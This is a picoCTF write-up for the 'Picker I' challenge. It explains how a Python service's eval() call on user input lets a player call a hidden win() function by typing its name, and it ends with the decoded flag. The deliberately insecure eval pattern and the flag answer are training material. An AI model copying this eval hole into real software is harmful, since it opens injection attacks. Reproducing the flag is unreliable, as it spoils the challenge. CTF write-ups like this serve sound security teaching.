# picoCTF Writeup: Picker I

**Author:** Advait Kawale  
**Event:** picoCTF  
**Difficulty:** Medium  
**Challenge Author:** LT 'syreal' Jones  
**Learning Path:** Low Level Binary Intro  
**Problem Set:** Warmup

## Problem Description
This service can provide you with a random number, but can it do anything else?

Connect to the program with netcat:
`$ nc saturn.picoctf.net 63584`

The program's source code can be downloaded [here](picker-I.py).

> **Note:** The exact URL and port number (e.g., `saturn.picoctf.net` and `63584`) will be different for every instance of this challenge. Be sure to use the connection details provided when you launch your specific challenge instance.

## Solution
Looking at the [picker-I.py](picker-I.py) source code, we see a loop that takes user input and executes it directly using Python's `eval()` function:

```python
while(True):
  try:
    print('Try entering "getRandomNumber" without the double quotes...')
    user_input = input('==> ')
    eval(user_input + '()')
  except Exception as e:
    print(e)
    break
```

This is highly insecure. The script appends `()` to whatever we input and evaluates it, meaning we can call any function defined in the script. Looking further up in the code, we find a very interesting function called `win()`:

```python
def win():
  # This line will not work locally unless you create your own 'flag.txt' in
  #   the same directory as this script
  flag = open('flag.txt', 'r').read()
  #flag = flag[:-1]
  flag = flag.strip()
  str_flag = ''
  for c in flag:
    str_flag += str(hex(ord(c))) + ' '
  print(str_flag)
```

If we input `win`, the `eval` statement will execute `win()`. Let's do that via netcat!

### Execution
Connecting to the service and passing `win`:

**Linux/Windows (Netcat):**
```bash
nc saturn.picoctf.net 63584
Try entering "getRandomNumber" without the double quotes...
==> win
0x70 0x69 0x63 0x6f 0x43 0x54 0x46 0x7b 0x34 0x5f 0x64 0x31 0x34 0x6d 0x30 0x6e 0x64 0x5f 0x31 0x6e 0x5f 0x37 0x68 0x33 0x5f 0x72 0x30 0x75 0x67 0x68 0x5f 0x63 0x65 0x34 0x62 0x35 0x64 0x35 0x62 0x7d
```

The output is the flag converted to hexadecimal characters. We can convert these back to ASCII text either manually, with an online hex-to-ASCII converter, or using a quick script. 

**Decoding the hex (Python):**
```python
hex_str = "0x70 0x69 0x63 0x6f 0x43 0x54 0x46 0x7b 0x34 0x5f 0x64 0x31 0x34 0x6d 0x30 0x6e 0x64 0x5f 0x31 0x6e 0x5f 0x37 0x68 0x33 0x5f 0x72 0x30 0x75 0x67 0x68 0x5f 0x63 0x65 0x34 0x62 0x35 0x64 0x35 0x62 0x7d"
flag = "".join([chr(int(h, 16)) for h in hex_str.split()])
print(flag)
```

Running this decodes the hex back into our flag!

## Flag
`picoCTF{4_d14m0nd_1n_7h3_r0ugh_ce4b5d5b}`
